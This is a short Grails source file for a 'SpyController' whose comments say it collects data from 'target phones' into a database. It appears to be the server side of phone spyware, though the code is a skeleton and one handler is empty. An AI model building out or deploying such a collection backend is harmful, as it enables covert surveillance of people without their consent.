package com.atlancy

import grails.converters.JSON;

import com.xaviar.market.rest.item.DataHolder;
import com.xaviar.market.rest.item.DataHolderConstants;


//main class for retrieving target phons data
class SpyController {

	def gateService

	private enum State {
		GET_SERVER_WISH, DATA, ERROR,EMPTY;
	}

	//get data from target phones and add it to the DB
	def gate(DataHolder dataHolder) {

		if(DataHolderConstants.GET_SERVER_WISH.equals(dataHolder.get(DataHolderConstants.STATE))){
			dataHolder = gateService.getServerRequest(dataHolder);
		}else{
			dataHolder = gateService.proccessClientData(dataHolder);
		}

		render dataHolder as JSON
	}


	def getdata ={

	}
}
